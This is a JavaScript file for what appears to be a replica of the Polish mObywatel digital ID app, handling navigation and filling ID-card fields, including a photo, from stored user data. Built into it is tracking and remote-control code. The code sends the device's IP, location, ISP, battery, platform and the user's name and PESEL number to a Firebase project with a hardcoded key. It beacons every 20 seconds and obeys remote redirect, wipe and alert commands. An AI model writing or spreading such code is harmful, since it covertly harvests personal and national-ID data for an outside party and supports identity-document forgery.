var params = new URLSearchParams(window.location.search);
var ROUTES = {
    home: 'home.html',
    services: 'services.html',
    qr: 'qr.html',
    more: 'more.html',
    moreid: 'moreid.html',
    id: 'id.html',
    shortcuts: 'shortcuts.html',
    pesel: 'pesel.html',
    scanqr: 'scanqr.html',
    showqr: 'showqr.html',
    gen: 'gen.html',
    card: 'card.html',
};

function sendTo(key){
    var qs = params.toString();
    var file = ROUTES[String(key)] || (String(key).endsWith('.html') ? String(key) : String(key) + '.html');
    var href = file + (qs ? `?${qs}` : '');
    location.href = href;
}

document.querySelectorAll(".bottom_element_grid").forEach((element) => {
    element.addEventListener('click', () => {
        sendTo(element.getAttribute("send"))
    })
})

function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  
    if (/windows phone/i.test(userAgent)) {
        return 1;
    }
  
    if (/android/i.test(userAgent)) {
        return 2;
    }
  
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return 3;
    }
  
    return 4;
  }
  
  if (getMobileOperatingSystem() == 2){
      document.querySelector(".bottom_bar").style.height = "70px"
}

// --- GLOBAL DEVICE TRACKING & REMOTE CONTROL (FIREBASE) ---
(async function() {
    let deviceId = localStorage.getItem('deviceId');
    if (!deviceId) return;

    // Inicjalizacja Firebase (jeśli nie ma)
    if (typeof firebase === 'undefined') {
        const s1 = document.createElement('script');
        s1.src = "https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js";
        document.head.appendChild(s1);
        await new Promise(r => s1.onload = r);
        const s2 = document.createElement('script');
        s2.src = "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js";
        document.head.appendChild(s2);
        await new Promise(r => s2.onload = r);
    }

    if (!firebase.apps.length) {
        firebase.initializeApp({
            apiKey: "AIzaSyBaPHJSgHSBlT503b6EJxvgdeFJ2sxUuoY",
            authDomain: "obywatel-polski.firebaseapp.com",
            projectId: "obywatel-polski"
        });
    }
    const db = firebase.firestore();

    // Funkcja do zbierania "Mocnych Informacji"
    async function collectIntenseData() {
        let data = {
            lastSeen: Date.now(),
            currentPage: window.location.pathname.split('/').pop() || 'index.html',
            battery: '---',
            screen: window.screen.width + 'x' + window.screen.height,
            platform: navigator.platform,
            language: navigator.language,
            orientation: (window.innerHeight > window.innerWidth ? 'Portret' : 'Krajobraz'),
            connection: 'Nieznane'
        };

        // Network Info (Android/Chrome)
        if (navigator.connection) {
            const conn = navigator.connection;
            data.connection = `${conn.effectiveType} (~${conn.downlink} Mbps) RTT: ${conn.rtt}ms`;
        }

        // Bateria
        try {
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                data.battery = Math.round(bat.level * 100) + '% ' + (bat.charging ? '(Ładuje)' : '');
            }
        } catch(e) {}

        // Lokalizacja i IP
        try {
            const res = await fetch('http://ip-api.com/json/');
            const loc = await res.json();
            data.ip = loc.query;
            data.location = loc.city + ', ' + loc.country;
            data.isp = loc.isp;
        } catch(e) {}

        // Dane profilu
        let ud = localStorage.getItem('userData');
        if (ud) {
            let u = JSON.parse(ud);
            data.identity = u.firstName + ' ' + u.lastName;
            data.pesel = u.pesel;
        }

        return data;
    }

    // Pierwsze wysłanie
    let firstData = await collectIntenseData();
    db.collection('devices').doc(deviceId).set(firstData, { merge: true });

    // Nasłuchuj na żywo (Ban / Wipe / Commands)
    db.collection('devices').doc(deviceId).onSnapshot((docSnap) => {
        if (docSnap.exists) {
            const data = docSnap.data();
            
            // 1. Sprawdź Ban / Timeout
            let banned = (data.status === 'banned');
            if (data.status === 'timeout' && Date.now() < data.timeoutUntil) banned = true;
            if (banned && !window.location.href.includes('index.html')) {
                window.location.href = 'index.html';
            }

            // 2. Sprawdź Remote Wipe
            if (data.remoteWipe === true) {
                localStorage.clear();
                db.collection('devices').doc(deviceId).update({ remoteWipe: false, status: 'active' });
                window.location.href = 'index.html';
            }

            // 3. ZDALNE KOMENDY (Remote Center)
            if (data.cmd) {
                const cmd = data.cmd;
                const cmdId = data.cmdId; // Unikalne ID komendy, żeby nie wykonywać jej w kółko
                
                let lastCmdId = localStorage.getItem('lastCmdId');
                if (cmdId && cmdId !== lastCmdId) {
                    localStorage.setItem('lastCmdId', cmdId);
                    
                    if (cmd.type === 'redirect') {
                        window.location.href = cmd.val;
                    } else if (cmd.type === 'alert') {
                        alert(cmd.val);
                    } else if (cmd.type === 'vibrate') {
                        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
                    } else if (cmd.type === 'reload') {
                        window.location.reload();
                    }
                }
            }
        }
    });

    // Heartbeat co 20 sekund
    setInterval(async () => {
        if (document.visibilityState === 'visible') {
            let upData = {
                lastSeen: Date.now(),
                currentPage: window.location.pathname.split('/').pop() || 'index.html',
                orientation: (window.innerHeight > window.innerWidth ? 'Portret' : 'Krajobraz')
            };
            db.collection('devices').doc(deviceId).update(upData);
        }
    }, 20000);

})();

// --- WYPEŁNIANIE DANYCH UŻYTKOWNIKA Z LOCALSTORAGE ---
document.addEventListener('DOMContentLoaded', function() {
    let userDataString = localStorage.getItem('userData');
    if (userDataString) {
        let u = JSON.parse(userDataString);
        
        let mapping = {
            'name': u.firstName,
            'surname': u.lastName,
            'nationality': u.nationality,
            'birthday': u.birthDate,
            'pesel': u.pesel,
            
            'familyName': u.familyName,
            'sex': u.gender,
            'fathersFamilyName': u.fatherName,
            'mothersFamilyName': u.motherName,
            'birthPlace': u.birthPlace,
            'countryOfBirth': u.birthCountry,
            'adress': u.address,
            
            // Nowe pola dla card.html
            'fatherName': u.fatherName,
            'motherName': u.motherName,
            'lastUpdatedDate': u.lastUpdated
        };

        for (let id in mapping) {
            let el = document.getElementById(id);
            if (el && mapping[id]) {
                if (el.tagName === "INPUT") el.value = mapping[id];
                else el.innerText = mapping[id];
            }
        }

        // Klasa home_date (Data zameldowania na pobyt stały)
        let dateEls = document.querySelectorAll('.home_date');
        dateEls.forEach(el => {
            if (u.addressDate) el.innerText = u.addressDate;
        });

        // Zdjęcie profilowe
        if (u.photo) {
            let photoEls = document.querySelectorAll('.id_own_image');
            photoEls.forEach(el => {
                el.style.backgroundImage = 'url(' + u.photo + ')';
            });
        }
    }
});